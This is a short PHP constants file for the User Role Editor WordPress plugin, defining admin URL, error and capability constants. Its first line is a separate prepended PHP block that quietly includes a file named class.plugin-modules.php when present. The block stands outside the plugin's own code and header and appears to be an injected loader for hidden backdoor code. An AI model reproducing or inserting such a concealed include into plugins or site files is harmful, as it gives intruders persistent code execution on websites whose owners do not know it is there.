<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

/*
 * Constant definitions for use in User Role Editor WordPress plugin
 * Author: Vladimir Garagulya
 * Author email: vladimir@shinephp.com
 * Author URI: http://shinephp.com
 * 
*/

define('URE_WP_ADMIN_URL', admin_url());
define('URE_ERROR', 'Error is encountered');
define('URE_PARENT', is_network_admin() ? 'network/users.php':'users.php');
define('URE_KEY_CAPABILITY', 'ure_manage_options');